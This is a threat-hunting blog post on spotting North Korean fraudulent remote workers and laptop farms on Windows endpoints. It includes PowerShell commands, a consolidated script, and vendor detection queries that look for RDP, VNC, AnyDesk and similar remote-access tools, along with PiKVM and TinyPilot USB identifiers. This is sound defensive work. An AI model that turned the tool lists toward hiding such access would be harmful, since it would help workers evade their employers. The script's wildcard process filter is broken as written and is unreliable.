---
layout: post
title: "Catching North Koreans & Laptop Farms"
date: 2025-06-13
tagline: "Detection Techniques for Farms on Your Network"
image: /IMG/060225.jpg
tags: [Threat Intelligence, Threat Hunting, Threat Analysis]
---

Since it is the flavor of the last few months and many are talking about it, I thought I would try to throw together all the detection techniques I could for catching DPRK worker schemes. I’ve also noticed that most are talking about techniques for catching them before they get hired – not many are talking about catching the ones that may already be working for them. So as a result, have a long blog post.
<br /><br />

Background: North Korea’s Remote Worker Deception
==============================================

<br />
In recent years, the U.S. government has publicly warned of a quiet but sophisticated campaign by North Korea to infiltrate the global tech workforce—not with malware, but with people. According to joint advisories from the FBI, Department of State, and the Department of the Treasury, the DPRK has deployed thousands of highly skilled IT professionals to work remotely for companies worldwide. Disguised as freelance developers or contractors, these operatives aim to generate revenue for the North Korean regime while gaining access to potentially sensitive technologies and internal corporate systems.

The scheme is both clever and troubling. These remote workers often present forged documents, including fake U.S. passports or stolen identities, to create credible profiles on platforms like LinkedIn, Upwork, and GitHub. Their resumes typically show legitimate-sounding job histories and technical skills—Python development, mobile app engineering, blockchain smart contracts. Many even go as far as staging video calls with manipulated visuals or avatars to mask their real identities. Payment is often laundered through intermediaries, crypto wallets, or foreign bank accounts, making detection especially challenging.

What's particularly insidious is how these individuals embed themselves into the software supply chain. By working for startups and small tech firms—often in roles with elevated privileges—they gain indirect access to larger systems and source code. In some cases, they've attempted to get jobs at cryptocurrency exchanges or fintech companies, likely to feed Pyongyang’s appetite for digital assets used to circumvent international sanctions. The U.S. government estimates that these operations may generate millions of dollars annually, funding everything from weapons programs to surveillance infrastructure.

This campaign differs from traditional cyber intrusion tactics by blending social engineering, fraud, and covert infrastructure. It's not just one individual posing as a freelancer—it’s an entire backend operation involving laptop farms, VPN obfuscation, and remote-control systems like PiKVM to simulate legitimate activity across dozens of devices. The objective isn't simply espionage; it’s financial survival for a regime increasingly isolated from the global economy. And as detection methods evolve, so too does the DPRK’s playbook—making it imperative for defenders to understand not just the actors, but the infrastructure that supports them – and tactics and indicators for discovering them.

<br />
# Inside the Infrastructure: Laptop Farms, PiKVMs, and Remote Access Tools
<br />

Beneath the surface of North Korea’s remote work campaign lies a dense and methodically engineered technical ecosystem. Far from a lone developer dialing in from a Pyongyang apartment, intelligence reports and private sector investigations have uncovered the widespread use of **“laptop farms”**—rooms filled with dozens of laptops or small-form-factor PCs connected to the same local area network. Each device is configured with a unique identity: its own OS install, user profile, browser history, or VPN tunnel. Typically these are commercial fleet machines shipped to the “remote worker”. From the outside, they appear to be different individuals logging in from different cities, or are multiple employees working across different organizations, when in reality they’re part of a centralized fraud operation controlled from afar.

![image](https://github.com/user-attachments/assets/db25f9f7-ec65-491f-b5ef-6f7c38aa8ce8)

To achieve remote access and simulate real user interaction, operators often leverage **PiKVMs**—open-source hardware devices that give full keyboard, video, and mouse control over a machine via the internet. PiKVMs are cheap, discreet, and highly effective. They or allow an operator to interact with a physical device as if they were sitting in front of it, complete with BIOS access and boot-time control. In the context of laptop farms, these devices act as remote control points, enabling one or two individuals to manage dozens of endpoints remotely, or allowing multiple users into the same LAN, without relying solely on traditional software like RDP or VNC, which might be more easily flagged by corporate detection tools.

That’s not to say software-based control tools are off the table. **Remote Desktop Protocol (RDP)** and **Virtual Network Computing (VNC)** remain common, particularly in setups involving virtual machines or when the operator needs to simulate human activity over a longer period. Some setups go as far as implementing browser automation frameworks like **Selenium** or **Puppeteer** to fake user behavior—opening emails, browsing GitHub, even mimicking typing patterns. Combined with a good VPN provider and time zone matching, this can convincingly simulate a freelance developer logging into Jira from “Denver” or “Bangalore.”

These infrastructures are often housed in nondescript locations: apartments, rented offices, or even shared co-working spaces, depending on the host country. What makes them especially hard to detect is that no malware needs to be deployed; the machines themselves aren’t compromised—they _are_ the operation. Everything is designed to look benign at a glance, and ultimately the intent is indeed to do good work for consistent pay. The challenge for defenders is that traditional endpoint detection may not immediately raise flags—unless you're specifically looking for the hallmarks of a laptop farm, like suspect ARP traffic, unusual USB device patterns, or eerily synchronized system activity across a cluster of machines.

![image](https://github.com/user-attachments/assets/86a0a988-a6dc-4972-8fac-b392ade42f08)

<br />
# Beyond the Interview: Why Pre-Onboarding Isn’t Enough
<br />

Many organizations have begun to wise up to the risks posed by fraudulent remote workers, especially in sensitive sectors like software development, finance, and healthcare. Vetting strategies now often include deeper background checks, identity verification services, video interviews, and even geolocation validation to confirm where a candidate is physically located. Some firms go as far as requiring hardware key handoffs, in-person onboarding, or biometric authentication. These measures are good—and in some cases, essential—but they’re still not foolproof.

The reality is that sophisticated actors have found ways to bypass even rigorous onboarding filters or are already on network . A candidate may pass every check with forged documents, borrowed credentials, or help from a third party. Once inside, they blend into the workforce like any other remote employee—slack messages, pull requests, commits, and meetings all proceed as expected. That's why this post focuses not on keeping adversaries out, but on **detecting them once they’re already in**. Because by the time the fraud is discovered through payroll anomalies or performance issues, the infrastructure may have already served its purpose—or worse, left a backdoor behind.

In the sections that follow, we’ll dive into technical strategies for spotting signs of laptop farms, remote-access tooling, and synchronized device clusters inside your environment. These detection methods lean heavily on endpoint telemetry, with a few network tricks, but it’s important to note that **you’re probably not going to see much happening on the actual network you are defending**. The focus here is what is happening on the individual machine, the remote LAN it is operating on, and if we can understand anything about that LAN while sitting outside of it. I’m also going to focus exclusively on Windows, obviously. There’s certainly space for Linux and Mac in this conversation, considering the likely outsized percentage of Developer roles falling to this scheme. That said, this draft has been sitting on my desktop for a week and I need to draw the line somewhere.

![image](https://github.com/user-attachments/assets/7cd5eef4-54f9-48e2-8ee7-0321fd802cf3)

So the overall intent of this post is to iterate through a few technical indicators worth drilling down into and how an analyst might detect them. I tried to generally split this into two “tracks” – first, a few local commands one could run using organic/built-in tools and commands (think Powershell, netstat, etc), then I run through a few different commercial tools that a SOC might have deployed.. keeping to the bigger ones, and within reason. The local stuff can also be used in conjunction with tools like Tanium Deploy or Crowdstrike Falcon’s Real-Time-Response (RTR) so – just attempting to slice this as many ways as I can. I wouldn’t call this the authoritative writeup of all things laptop farm but it’s as authoritative as I could muster given my own time/patience/knowledge.

<br />
# RDP/VNC and Software Detection
<br />

I’ll start with some of the easier stuff that most fleet systems shouldn’t have enabled in the first place, or at least be tightly controlled. Applications like AnyDesk or enabled RDP are generally basic steps most SOCs should have detection logic in place already, but for posterity let’s run through a few. At first, I leaned towards not mentioning this stuff as it felt a bit basic and would end up cluttering the post – however, when I outlined this post out it felt incomplete without including this. If you’re familiar with detecting these or have them outright disallowed in your network, feel free to just skip through this portion.

<br />
## Remote Desktop Protocol (RDP)
<br />

RDP is Microsoft's proprietary protocol for remote desktop access, built into Windows systems by default. It allows full desktop control over TCP port 3389 and is often the first choice for managing Windows machines remotely due to its native integration and performance. If you haven’t chased this down in a lab exercise or in a live SOC environment, there’s a few different ways you might catch this. Here’s some Powershell to start:

### Detection Techniques:

```powershell
# Check for RDP service status and active sessions_

Get-Service TermService | Select-Object Status, StartType
```
<br />
**What it does:**
<br />

- Queries the **"Remote Desktop Services"** Windows service (named TermService).
- Displays its **Status** (e.g., Running, Stopped) and **StartType** (e.g., Automatic, Manual, Disabled).

<br />
**Why it's useful:**  

This tells you whether RDP is enabled and running on the machine. If TermService is **running and set to start automatically**, the system is likely accepting incoming RDP connections.
<br />
```powershell
qwinsta /server:localhost
```
<br />
**What it does:**

- qwinsta (Query WINdows STAtion) lists all active **Remote Desktop sessions** on the local machine.
- Shows session ID, user name, session state (Active/Disconnected), and type (console/rdp-tcp).

<br />
**Why it's useful:**
<p></p>
This gives you **live visibility** into current or recently disconnected RDP sessions, which can help detect unauthorized or suspicious remote access.

```powershell
# Monitor RDP-related processes and connections_
Get-Process | Where-Object {$\_.ProcessName -like "\*rdp\*" -or $\_.ProcessName -like "\*mstsc\*"}
```
<p></p>
**What it does:**

- Lists running processes that include "rdp" or "mstsc" in the name.
- mstsc.exe is the **Remote Desktop Client** (used to initiate outbound RDP sessions).
<p></p>
**Why it's useful:**  
This helps detect if someone on the machine is **actively running an RDP client**, which could indicate outbound connections to other systems—especially useful in lateral movement detection.

```powershell
netstat -an | findstr :3389
```
<p></p>
**What it does:**

- Uses netstat to list **active network connections and listeners**.
- findstr :3389 filters the results to only show connections involving **port 3389**, the default RDP port.
<p></p>
**Why it's useful:**

This quickly tells you if the system is:

- **Listening** for inbound RDP connections (0.0.0.0:3389 or ::1:3389 in LISTENING state).
- **Actively connected** to or from another IP on port 3389.
<p></p>
Another key indicator is **Windows Event IDs 4624/4625 with LogonType 10**. 4624 is a successful logon event in Windows Security Logs, and 4625 is a failed one. Both include the field “Logon Type” which describes how the user logged in. A LogonType 10 specifically refers to **RemoteInteractive** logons (like RDP).

**Why it's useful:**

- **Logon Type 10** is the canonical indicator of **RDP usage**, both successful and failed attempts.
- Monitoring for **4624 with Logon Type 10** shows **when and who successfully connected via RDP**.
- Monitoring for **4625 with Logon Type 10** surfaces **failed RDP login attempts**, which can be an early warning for **brute force** or unauthorized access attempts.
- You can also correlate these with:
  - **Source IP address** (IpAddress field)
  - **Username** (TargetUserName)
  - **Workstation name**
  - **Logon Process Name** (should typically be User32 or Advapi for RDP)
<p></p>
Finally, here’s a bunch of queries for your preferred tool. This is specific to _inbound_ RDP usage, or at least a LISTEN on 3389. These will need to be further customized if you’re looking for more generic RDP, lateral, or outbound stuff.

| **Tool** | **Detection Logic / Rule / Location** |
| --- | --- |
| **Cortex XDR** | dataset = xdr_data<br>\| filter event_type = "network"<br>\| filter action_network_remote_port = 3389<br>\| filter action_network_inbound = true<br>\| filter not(ip_network_contains("10.0.0.0/8", action_remote_ip)<br>or ip_network_contains("172.16.0.0/12", action_remote_ip)<br>or ip_network_contains("192.168.0.0/16", action_remote_ip)) |
| **CrowdStrike Falcon** | #event_simpleName=/^(NetworkReceiveAcceptIP4\|NetworkListenIP4)$/ event_platform=Win LocalPort=3389<br>Also searchable in Falcon console under **"User Activity"** telemetry. |
| **Elastic Agent (KQL)** | event.category:network and event.type:connection and destination.port:3389 and network.direction:inbound<br>and not (<br>source.ip:10.0.0.0/8 or<br>source.ip:172.16.0.0/12 or<br>source.ip:192.168.0.0/16<br>) |
| **osquery** | SELECT<br>pid,<br>protocol,<br>local_address,<br>local_port,<br>remote_address,<br>remote_port,<br>state<br>FROM process_open_sockets<br>WHERE remote_port = 3389 OR local_port = 3389; |
| **SentinelOne XDR** | ( event.type == "Login" AND event.login.type in:matchcase( "REMOTE_INTERACTIVE", "NETWORK", "CACHED_REMOTE_INTERACTIVE", "NETWORK_CLEAR_TEXT", "NETWORK_CREDENTIALS" ) AND event.login.loginIsSuccessful == true ) |
| **Tenable Nessus** | Detects exposed RDP (TCP 3389) as a potential vulnerability or misconfiguration. Look for plugin IDs like **10940** (Remote Desktop Protocol Service Detection) or **5935** (Windows RDP / Terminal Services Detection). |

<p></p>
## Virtual Network Computing (VNC)
<p></p>
VNC is a cross-platform remote desktop protocol that transmits keyboard, mouse, and screen data over a network. Unlike RDP, VNC works across different operating systems and typically uses ports 5900-5905, making it popular for mixed-environment laptop farms. Same premise here with the Powershell to start, except we’ll mix in some basic cmd as well:
<p></p>
### Detection Techniques:
<p></p>
```cmd
tasklist | findstr /i "vnc x11vnc tightvnc realvnc tigervnc uvnc ultra"
wmic process where "name like '%vnc%'" get name,processid,executablepath
```
<p></p>
**What it does:**

- **`tasklist | findstr`**: Lists all running processes (\`tasklist\`) and filters (\`findstr\`) for common VNC-related process names (case-insensitive \`/i\`).

- **`wmic process`**: Uses Windows Management Instrumentation (WMI) to find processes with "vnc" in their name and displays their name, PID, and full executable path.
<p></p>
**Why it's useful:**

- Detects **active VNC servers** (e.g., TightVNC, UltraVNC, RealVNC).

- Helps identify **unauthorized remote access tools** running in memory.

- The \`wmic\` version gives **more details** (like exact executable location), useful for forensic analysis.

---

```cmd
netstat -ano | findstr ":5900 :5901 :5902 :5903 :5904 :5905"

# And in PowerShell:
Get-NetTCPConnection -State Listen | Where-Object { $\_.LocalPort -ge 5900 -and $\_.LocalPort -le 5905 }
```

**What it does:**

- **`netstat -ano`**: Lists all active network connections (\`-a\`), shows ports numerically (\`-n\`), and includes owning process IDs (\`-o\`).

- \`findstr\` filters for **default VNC ports (5900-5905)**.

- **PowerShell version**: Uses \`Get-NetTCPConnection\` to check for listening ports in the VNC range (5900-5905).

**Why it's useful:**

- Confirms if **VNC is actively listening** for incoming connections.

- Helps detect **hidden VNC servers** (if they use standard ports).

- The \`-o\` flag in \`netstat\` links ports to **Process IDs (PIDs)**, helping trace back to the executable.

---

```cmd
dir /s /b C:\Users\*\.vnc
dir /s /b C:\Users\*\vnc.ini
dir /s /b C:\Users\*\ultravnc.ini
dir /s /b "C:\Program Files\*vnc*"
dir /s /b "C:\Program Files (x86)\*vnc*"
# And in PowerShell:
Get-ChildItem -Path C:\Users -Recurse -Force -Include "*vnc*" -ErrorAction SilentlyContinue
Get-ChildItem -Path "C:\Program Files*" -Recurse -Force -Include "*vnc*" -ErrorAction SilentlyContinue
```  


**What it does:**

- Searches for **VNC config files** (\`.vnc\`, \`vnc.ini\`, \`ultravnc.ini\`) in user profiles (\`C:\\Users\`).

- Looks for **VNC installation directories** in \`Program Files\`.

- **PowerShell version** does the same but with better error handling (\`-ErrorAction SilentlyContinue\`).

***Why it's useful:**

- Finds **stored VNC passwords** (some VNC servers store passwords in plaintext or weakly encrypted).

- Helps identify **old/uninstalled VNC software** (leftover files may contain sensitive data).

- Useful to see if VNC was ever installed.

## AnyDesk, TeamViewer, pick your preferred EXE

AnyDesk is a commercial remote desktop application known for its ease of deployment and ability to traverse NAT/firewall restrictions. It's particularly favored in laptop farm operations because it requires minimal configuration and can establish connections through relay servers without complex network setup.

TeamViewer is a widely-used commercial remote access solution that supports cross-platform connections and includes features like file transfer and VPN functionality. Its commercial legitimacy makes it attractive for laptop farm operators who want to appear professional, though it also creates extensive logs that can reveal suspicious usage patterns.

At this point, you might be thinking that there’s any number of applications with proprietary protocols you could go after. **ScreenConnect, Splashtop, RustDesk, and others**—each with its own trade-offs in stealth, performance, and forensic footprint. If you think that kind of sucks and maybe your shop should just block all this stuff – or any unauthorized app install at ALL – you’d be correct. That said, assuming this stuff might be allowed or sneak on to a system, let’s try to knock all this out in some consolidated queries.

The below takes the prior RDP and VNC indicators and throws in a couple more well-known Remote Access tools into a consolidated Powershell script. If you suspect others in your environment, it’s pretty simple to add in string searches or other keywords within this script. After that is another table of the fancy tools that I will consolidate as much of the prior as possible as well. Warning – this will end up looking hilariously messy. For that reason (as you may have noticed in the prior RDP section) and in the interest of space, these will output as raw results rather than formatted tables. You’re probably better off outputting these results as formatted tables or limiting to certain fields. Don’t say I didn’t warn you.

### Detection Techniques:

``` Powershell
# Consolidated Remote Access Tool Detection Script
# Checks for VNC, AnyDesk, TeamViewer, ScreenConnect, RDP, and others

# 1. Detect Running Processes & Services
Write-Host "`n[!] Checking for running remote access processes..." -ForegroundColor Yellow
$remoteTools = @(
    "*vnc*", "*anydesk*", "*teamviewer*", "*screenconnect*", "*connectwise*",
    "*splashtop*", "*logmein*", "*gotomypc*", "*radmin*", "*ultraviewer*", "*rustdesk*"
)
Get-Process | Where-Object { $_.Name -like ($remoteTools -join " -or Name -like ") } | Select-Object Name, Id, Path
Get-Service | Where-Object { $_.DisplayName -like ($remoteTools -join " -or DisplayName -like ") } | Select-Object Name, DisplayName, Status

# 2. Check Listening Ports (VNC, RDP, etc.)
Write-Host "`n[!] Checking for common remote access ports..." -ForegroundColor Yellow
$remotePorts = @(5900, 5901, 5902, 3389, 5938, 6568, 7070, 8172)
Get-NetTCPConnection -State Listen | Where-Object { $remotePorts -contains $_.LocalPort } | 
    Select-Object LocalAddress, LocalPort, OwningProcess | 
    ForEach-Object {
        $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
        [PSCustomObject]@{
            Port = $_.LocalPort
            Process = $proc.Name
            PID = $_.OwningProcess
            Path = $proc.Path
        }
    }

# 3. Check Registry for Installed Software
Write-Host "`n[!] Checking registry for remote access tools..." -ForegroundColor Yellow
$regPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
Get-ItemProperty $regPaths | Where-Object { 
    $_.DisplayName -match "vnc|anydesk|teamviewer|screenconnect|connectwise|splashtop|logmein|radmin|ultraviewer|rustdesk" 
} | Select-Object DisplayName, InstallLocation

# 4. Check Common Installation Directories
Write-Host "`n[!] Scanning for installation files..." -ForegroundColor Yellow
$searchPaths = @(
    "$env:ProgramFiles", 
    "$env:ProgramFiles (x86)", 
    "$env:APPDATA", 
    "$env:LOCALAPPDATA"
)
$searchTerms = @("*vnc*", "*anydesk*", "*teamviewer*", "*screenconnect*", "*connectwise*", "*splashtop*")
foreach ($path in $searchPaths) {
    Get-ChildItem -Path $path -Recurse -Force -Include $searchTerms -ErrorAction SilentlyContinue | 
        Select-Object FullName, LastWriteTime
}

# 5. Check for Log Files (TeamViewer, AnyDesk, etc.)
Write-Host "`n[!] Checking for remote access log files..." -ForegroundColor Yellow
$logFiles = @(
    "$env:ProgramFiles*\TeamViewer\TeamViewer*_Logfile.log",
    "$env:APPDATA\AnyDesk\*.trace",
    "$env:ProgramData\ScreenConnect\Logs\*.log"
)
foreach ($log in $logFiles) {
    if (Test-Path $log) {
        Get-Content $log | Select-String -Pattern "Connection|established|session" -CaseSensitive:$false | Select-String -NotMatch -Pattern "disconnected" | Select-Object -First 5
    }
}

# 6. Check RDP Configuration (Optional)
Write-Host "`n[!] Checking RDP (Remote Desktop) Status..." -ForegroundColor Yellow
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
Get-NetFirewallRule -DisplayName "*Remote Desktop*" | Where-Object { $_.Enabled -eq "True" } | Select-Object DisplayName, Enabled
```



| **Tool** | **Detection Logic / Rule / Location** |
| --- | --- |
| **Cortex XDR** | dataset = xdr_data<br><br>\| filter<br><br>// Network connections to common remote access ports<br><br>(<br><br>action_network_remote_port in (3389, 5900, 5901, 5902, 5938, 6568, 7070, 8172)<br><br>and action_network_inbound = true<br><br>and not(<br><br>ip_network_contains("10.0.0.0/8", action_remote_ip) or<br><br>ip_network_contains("172.16.0.0/12", action_remote_ip) or<br><br>ip_network_contains("192.168.0.0/16", action_remote_ip)<br><br>)<br><br>)<br><br>or<br><br>// Process executions of remote access tools<br><br>(<br><br>event_type = "process"<br><br>and (<br><br>lowercase(actor_process_name) like "%vnc%" or<br><br>lowercase(actor_process_name) like "%anydesk%" or<br><br>lowercase(actor_process_name) like "%teamviewer%" or<br><br>lowercase(actor_process_name) like "%screenconnect%" or<br><br>lowercase(actor_process_name) like "%connectwise%" or<br><br>lowercase(actor_process_name) like "%splashtop%" or<br><br>lowercase(actor_process_name) like "%radmin%" or<br><br>lowercase(actor_process_name) like "%rustdesk%"<br><br>)<br><br>)<br><br>or<br><br>// File creations/modifications of config files<br><br>(<br><br>event_type = "file"<br><br>and (<br><br>lowercase(file_path) like "%\\\\anydesk\\\\%" or<br><br>lowercase(file_path) like "%\\\\teamviewer\\\\%" or<br><br>lowercase(file_path) like "%\\\\ultravnc.ini" or<br><br>lowercase(file_path) like "%\\\\vnc.ini" or<br><br>lowercase(file_path) like "%\\\\screenconnect\\\\%" or<br><br>lowercase(file_path) like "%\\\\splashtop\\\\%"<br><br>)<br><br>) |
| **CrowdStrike Falcon** | (<br><br>\# 1. Network Connections (RDP/VNC/TeamViewer/AnyDesk)<br><br>(<br><br>event_simpleName=/^(NetworkReceiveAcceptIP4\|NetworkListenIP4\|RemoteIp4)$/<br><br>event_platform="Win"<br><br>LocalPort IN (3389, 5900, 5901, 5902, 5938, 6568, 7070, 8172)<br><br>AND NOT ip_network_contains(LocalAddress_ip4, "10.0.0.0/8")<br><br>AND NOT ip_network_contains(LocalAddress_ip4, "192.168.0.0/16")<br><br>AND NOT ip_network_contains(LocalAddress_ip4, "172.16.0.0/12")<br><br>)<br><br>OR<br><br>\# 2. Process Executions<br><br>(<br><br>event_simpleName="ProcessRollup2"<br><br>(<br><br>FileName IN ("vncserver.exe", "winvnc.exe", "tvnserver.exe", "anydesk.exe", "teamviewer.exe", "screenconnect.exe", "splashtop.exe", "rustdesk.exe")<br><br>OR FileName LIKE "%vnc%"<br><br>OR FileName LIKE "%anydesk%"<br><br>OR FileName LIKE "%teamviewer%"<br><br>)<br><br>)<br><br>OR<br><br>\# 3. Service Creations<br><br>(<br><br>event_simpleName="ServiceStarted"<br><br>(<br><br>ServiceFileName IN ("vncserver.exe", "winvnc.exe", "anydesk.exe", "teamviewer_service.exe")<br><br>OR ServiceName LIKE "%vnc%"<br><br>OR ServiceName LIKE "%anydesk%"<br><br>)<br><br>)<br><br>OR<br><br>\# 4. File Modifications (Configs)<br><br>(<br><br>event_simpleName IN ("PeFileWritten", "FileWritten")<br><br>(<br><br>TargetFileName LIKE "%\\\\anydesk\\\\%.ini"<br><br>OR TargetFileName LIKE "%\\\\ultravnc.ini"<br><br>OR TargetFileName LIKE "%\\\\vnc\\\\%"<br><br>OR TargetFileName LIKE "%\\\\teamviewer\\\\%"<br><br>)<br><br>)<br><br>\| eval Protocol=case(<br><br>LocalPort=3389, "RDP",<br><br>LocalPort IN (5900, 5901, 5902), "VNC",<br><br>LocalPort=5938, "TeamViewer",<br><br>LocalPort=7070, "AnyDesk",<br><br>LocalPort=8172, "ScreenConnect",<br><br>1=1, "Other"<br><br>) |
| **Elastic Agent** | (<br><br>(event.type: (connection or start) and network.direction: "inbound" and destination.port: (3389 or 5900 or 5901 or 5902 or 5938 or 7070 or 8172) and<br><br>not source.ip: ("10.0.0.0/8" or "172.16.0.0/12" or "192.168.0.0/16"))<br><br>) or (<br><br>process.name: \*vnc\* or<br><br>process.name: \*anydesk\* or<br><br>service.name: \*teamviewer\* or<br><br>file.path: \*\\\\screenconnect\\\\\* or<br><br>registry.path: \*\\\\rustdesk\\\\\*<br><br>) |
| **osquery** | SELECT<br><br>'network' AS type,<br><br>p.pid,<br><br>p.name AS process,<br><br>pos.local_port,<br><br>pos.remote_address,<br><br>CASE<br><br>WHEN pos.local_port IN (5900,5901,5902) THEN 'VNC'<br><br>WHEN pos.local_port = 3389 THEN 'RDP'<br><br>WHEN pos.local_port = 5938 THEN 'TeamViewer'<br><br>WHEN pos.local_port = 7070 THEN 'AnyDesk'<br><br>ELSE 'Other'<br><br>END AS tool<br><br>FROM process_open_sockets pos<br><br>JOIN processes p USING(pid)<br><br>WHERE pos.local_port IN (3389,5900,5901,5902,5938,7070,8172)<br><br>UNION ALL<br><br>SELECT<br><br>'process' AS type,<br><br>pid,<br><br>name AS process,<br><br>NULL AS local_port,<br><br>NULL AS remote_address,<br><br>CASE<br><br>WHEN name LIKE '%vnc%' THEN 'VNC'<br><br>WHEN name LIKE '%anydesk%' THEN 'AnyDesk'<br><br>WHEN name LIKE '%teamviewer%' THEN 'TeamViewer'<br><br>ELSE 'Other'<br><br>END AS tool<br><br>FROM processes<br><br>WHERE name LIKE '%vnc%' OR name LIKE '%anydesk%' OR name LIKE '%teamviewer%'<br><br>UNION ALL<br><br>SELECT<br><br>'service' AS type,<br><br>NULL AS pid,<br><br>name AS process,<br><br>NULL AS local_port,<br><br>NULL AS remote_address,<br><br>'Persistent' AS tool<br><br>FROM services<br><br>WHERE name LIKE '%vnc%' OR name LIKE '%anydesk%'; |
| **SentinelOne XDR** | (<br><br>// 1. All detection methods combined<br><br>(event.type == "Login" AND event.login.loginIsSuccessful AND<br><br>event.login.type in:matchcase("REMOTE_INTERACTIVE", "NETWORK\*", "CACHED\*"))<br><br>OR<br><br>(event.type == "Process" AND event.process.name matches:wildcard("\*vnc\*", "\*anydesk\*", "\*teamviewer\*"))<br><br>OR<br><br>(event.type == "Network" AND event.network.dstPort in:(3389, 5900, 5901, 5902, 5938, 7070, 8172) AND<br><br>NOT ip.inRange(event.network.remoteAddress, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"))<br><br>OR<br><br>(event.type == "File" AND event.file.fullPath matches:wildcard("\*\\\\anydesk\\\\\*", "\*\\\\vnc\\\\\*", "\*ultravnc.ini"))<br><br>) |
| **Tenable Nessus** | So many plugins. Use the search function on the [Plugin database](https://www.tenable.com/plugins/search), but here’s a few quick ones.<br><br>**10940** Remote Desktop Protocol Service Detection<br><br>**5935** Windows RDP / Terminal Services Detection<br><br>**189953** AnyDesk Installed (Windows)<br><br>**10342** VNC Software Detection<br><br>**6065** VNC Client Detection<br><br>**52715** TeamViewer Version Detection<br><br>**121245** TeamViewer remote detection |

## A Quick Note on Apache Guacamole and other Clientless Remote Access Stuff

[Apache Guacamole](https://guacamole.apache.org/) is an open-source, clientless remote desktop gateway that allows users to securely access and control remote computers through a web browser. Supporting protocols like RDP, VNC, and SSH, it eliminates the need for specialized client software by delivering remote sessions entirely via HTML5. This makes it highly flexible and accessible from virtually any device with internet access, while centralizing remote access management and improving security by acting as a proxy between users and target systems.

I’ve seen Guacamole as part of this scheme in the wild once or twice and have been asked about it in the context of remote worker schemes so I’ll briefly clarify here: Apache Guacamole can certainly be an indicator worth investigating. HOWEVER, it’s critical to understand that the target machine still requires an underlying RDP, VNC, or SSH connection. The difference is that the connection is routed through the Guacamole gateway rather than directly from the remote worker. Therefore, host-based indicators of remote access software will remain the same and are functionally unchanged for an analyst’s detection purposes—except for one important caveat, which I will cover later in the Network Technical Indicators section.

# Hardware Detection

Alright let’s get into some of the fun stuff and really more of the reason I started writing this up: some of the more clever ways to pull this off and what we can do about it…. While software-based remote access tools leave obvious traces in process lists and network connections, hardware-based solutions like PiKVM and TinyPilot present a more sophisticated challenge. These devices provide out-of-band management capabilities that operate independently of the target system's operating system, making them significantly harder to detect through traditional endpoint monitoring. Briefly:

## PiKVM (Pi-based Keyboard, Video, Mouse)

PiKVM is an open-source hardware solution built on Raspberry Pi that provides complete KVM-over-IP functionality. It connects directly to a target machine's HDMI, USB, and power ports, allowing full control including BIOS access, boot management, and pre-OS operations. In laptop farm scenarios, PiKVM devices enable operators to manage dozens of machines remotely without installing any software on the target systems.

## TinyPilot

TinyPilot is a commercial KVM-over-IP solution similar to PiKVM but with a more polished interface and enterprise features. It provides browser-based remote control of target machines through direct hardware connections. TinyPilot devices are particularly attractive for laptop farm operations because they require no software installation and can operate even when the target system is powered off.

## Detections

These are, frankly, pretty tough to detect if sufficiently customized, namely because a user can customize the configuration to throw dummy values. That said, I’d say the current authoritative source on how to do that has already been done by [Grumpy Goose Labs](https://blog.grumpygoose.io/hold-me-closer-tinypilot-f94455431921) in a couple of [blog posts.](https://blog.grumpygoose.io/unemployfuscation-1a1721485312) Frankly there’s nothing really to add to it and I’d just be cribbing their notes. That said, I can at least take those indicators and plug them into logic for the big list o’ tools. I’ll also add a few more queries you can try that aren’t necessarily specific to PiKVM or TinyPilot, but may assist in identifying similar devices – since they’re probably going to switch up (and have.. as you’ll see at the end of this).

So first things first, let’s restate the good work from Grumpy Goose in the form of default config and indicators. Most of this relies on the default configuration of both devices. This is how they would present themselves to the OS of the system they are accessing via physical plug-in.

**TinyPilot:**

- **Vendor ID (VID):** 1D6B
- **Product ID (PID):** 0104
- **Serial Number:** 6b65796d696d6570690
- **Manufacturer:** tinypilot

**PiKVM:**

- **Vendor ID (VID):** 1D6B
- **Product ID (PID):** 0104
- **Serial Number:** CAFEBABE
- **Manufacturer:** PiKVM

**Why it's useful:**

These identifiers are consistent in default configurations and can be used to detect hardware KVM devices connected to endpoints.

### PowerShell Detection Commands

**TinyPilot Detection:**

```powershell
Get-CimInstance -ClassName Win32_PnPEntity |
Where-Object { $\_.PNPDeviceID -like '\*6b65796d696d6570690\*' } |
Select-Object Description, Name, DeviceID, Manufacturer
```

**PiKVM Detection:**

```powershell
Get-CimInstance -ClassName Win32_PnPEntity |
Where-Object { $\_.PNPDeviceID -like '\*CAFEBABE\*' } |
Select-Object Description, Name, DeviceID, Manufacturer
```

**Why it's useful:**

These commands allow for the identification of connected devices based on known serial numbers, facilitating the detection of each KVM type.

So Grumpy Goose has the Crowdstrike query locked down great, here’s the big table of everybody else (and also a more generic offering on my behalf for Falcon)

| **Tool** | **Detection Logic / Rule / Location** |
| --- | --- |
| **Cortex XDR** | dataset = xdr_data<br><br>\| filter event_type = ENUM.DEVICE<br><br>and (device_instance_id contains "6b65796d696d6570690" or device_instance_id contains "CAFEBABE")<br><br>\| fields agent_hostname, event_sub_type, device_instance_id, device_vendor_id, device_product_id, actor_process_image_name, \_time<br><br>\| sort \_time desc |
| **CrowdStrike Falcon** | \`\`\`(event_simpleName="PnPDeviceConnected" OR event_simpleName="DcUsbDeviceConnected")<br><br>AND (DeviceInstanceId="\*6b65796d696d6570690\*" OR DeviceInstanceId="\*CAFEBABE\*")<br><br>\| table timestamp, ComputerName, DeviceName, DeviceInstanceId, DeviceManufacturer, DeviceDescription\`\`\` |
| **Elastic Agent (KQL)** | event.category : "device" and<br><br>(event.action : "connected" or event.action : "device_add") and<br><br>(device.device_id : "\*6b65796d696d6570690\*" or device.device_id : "\*CAFEBABE\*") |
| **osquery** | SELECT<br><br>vendor,<br><br>vendor_id,<br><br>product,<br><br>serial,<br><br>model<br><br>FROM usb_devices<br><br>WHERE serial LIKE '%6b65796d696d6570690%'<br><br>OR serial LIKE '%CAFEBABE%'; |
| **SentinelOne XDR** | event_type = "USB_DEVICE"<br><br>AND (<br><br>usb.serial_number CONTAINS "6b65796d696d6570690" OR<br><br>usb.serial_number CONTAINS "CAFEBABE"<br><br>) |
